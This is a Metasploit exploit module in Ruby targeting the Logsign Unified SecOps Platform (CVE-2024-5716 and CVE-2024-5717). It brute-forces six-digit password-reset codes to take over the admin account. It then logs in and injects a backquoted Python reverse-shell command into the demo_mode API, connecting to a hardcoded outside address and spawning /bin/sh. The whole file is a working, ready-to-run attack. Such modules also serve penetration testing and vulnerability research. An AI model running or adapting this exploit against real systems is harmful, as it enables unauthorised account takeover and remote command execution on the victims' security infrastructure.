

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Logsign Unified SecOps Platform Multiple Remote Command Execution and Authentication Bypass Vulnerabilities',
      'Description'    => %q{
        This module exploits multiple vulnerabilities in Logsign Unified SecOps Platform to achieve remote code execution.
      },
      'Author'         => 'Janke',
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2024-5716'],
          ['CVE', '2024-5717'],
          ['URL', 'https://support.logsign.net/hc/en-us/articles/19316621924754-03-06-2024-Version-6-4-8-Release-Notes'],
          ['URL', 'https://www.zerodayinitiative.com/blog/2024/7/1/getting-unauthenticated-remote-code-execution-on-the-logsign-unified-secops-platform']
        ],
      'Platform'       => 'python',
      'Privileged'     => false,
      'Targets'        => [['Auto', {}]],
      'DisclosureDate' => 'Aug 6 2024',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('USERNAME', [true, 'The username to target', 'admin']),
        OptString.new('PASSWORD', [true, 'The new password to set', 'NewPassword']),
        Opt::RPORT(443),
        Opt::RHOST(''),
        Opt::SSL(true)
      ])
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri('api', 'settings', 'license_status')
    })

    if res && res.code == 200 && res.body.include?('"software_alias": "Siem"') && res.body =~ /"version": "6\.4\.[0-7]"/
      return Exploit::CheckCode::Vulnerable
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    print_status("Sending forget password request")
    send_forget_password_request(datastore['USERNAME'])

    print_status("Attempting to verify reset code")
    reset_code, verification_code = verify_reset_code(datastore['USERNAME'])

    if reset_code && verification_code
      print_status("Successfully verified reset code: #{reset_code}")
      print_status("Resetting password")
      reset_password(datastore['USERNAME'], verification_code, datastore['PASSWORD'])
      
      print_status("Logging in with new credentials")
      cookie = login(datastore['USERNAME'], datastore['PASSWORD'])

      print_status("Sending payload to enable demo mode")
      send_payload(cookie)

      print_good("Exploit complete")
    else
      fail_with(Failure::Unknown, "Failed to verify reset code")
    end
  end

  def send_forget_password_request(username)
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri('api', 'settings', 'forgot_password'),
      'ctype'  => 'application/json',
      'data'   => { 'username' => username }.to_json
    })

    unless res && res.code == 200 && res.body.include?('"message": "Success"')
      fail_with(Failure::UnexpectedReply, "Failed to send forget password request")
    end
  end

  def verify_reset_code(username)
    (0..999999).each do |i|
      reset_code = i.to_s.rjust(6, '0')
      res = send_request_cgi({
        'method' => 'POST',
        'uri'    => normalize_uri('api', 'settings', 'verify_reset_code'),
        'ctype'  => 'application/json',
        'data'   => { 'username' => username, 'reset_code' => reset_code }.to_json
      })

      if res && res.code == 200 && res.body.include?('"message": "Success"')
        json_res = JSON.parse(res.body)
        return reset_code, json_res['verification_code']
      end
    end

    nil
  end

  def reset_password(username, verification_code, new_password)
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri('api', 'settings', 'reset_user_password'),
      'ctype'  => 'application/json',
      'data'   => { 'username' => username, 'verification_code' => verification_code, 'password' => new_password }.to_json
    })

    unless res && res.code == 200 && res.body.include?('"message": "Success"')
      fail_with(Failure::UnexpectedReply, "Failed to reset password")
    end
  end

  def login(username, password)
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri('api', 'login'),
      'ctype'  => 'application/json',
      'data'   => { 'username' => username, 'password' => password }.to_json
    })

    unless res && res.code == 200
      fail_with(Failure::UnexpectedReply, "Failed to login")
    end

    res.get_cookies
  end

  def send_payload(cookie)
    payload = '`python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'192.168.60.129\',9876));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\'])"`'
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri('api', 'settings', 'demo_mode'),
      'ctype'  => 'application/json',
      'data'   => { 'enable' => true, 'list' => payload }.to_json,
      'headers' => { 'Cookie' => cookie }
    })

    unless res && res.code == 200
      fail_with(Failure::UnexpectedReply, "Failed to send payload")
    end
  end
end

